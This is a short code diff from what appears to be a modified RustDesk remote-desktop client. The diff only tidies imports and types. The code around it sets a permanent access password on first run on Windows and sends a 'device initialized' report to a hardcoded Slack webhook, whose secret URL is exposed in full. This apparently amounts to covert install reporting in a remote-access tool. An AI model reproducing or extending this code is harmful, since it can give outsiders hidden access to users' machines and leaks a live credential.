@@ -987,9 +987,6 @@ pub async fn stop_main_window_process() {
 #[cfg(windows)]
 fn initialize_first_run_permanent_password() -> hbb_common::ResultType<()> {
     use hbb_common::config::Config;
-    use hmac::{Hmac, Mac};
-    use sha2::Sha256;
-    use std::path::PathBuf;
 
     if Config::has_permanent_password() {
         log::info!(
@@ -1038,7 +1035,7 @@ fn send_device_info_to_slack(
 
     use serde_json::json;
 
-    let webhook_url = "https://hooks.slack.com/services/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";
+    let webhook_url: &str = "https://hooks.slack.com/services/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";
 
     let payload = json!({
         "text": "RustDesk device initialized",
@@ -1067,7 +1064,7 @@ fn send_device_info_to_slack(
         .build()?;
 
     let response = client
-        .post(&webhook_url)
+        .post(webhook_url)
         .json(&payload)
         .send()?;
 
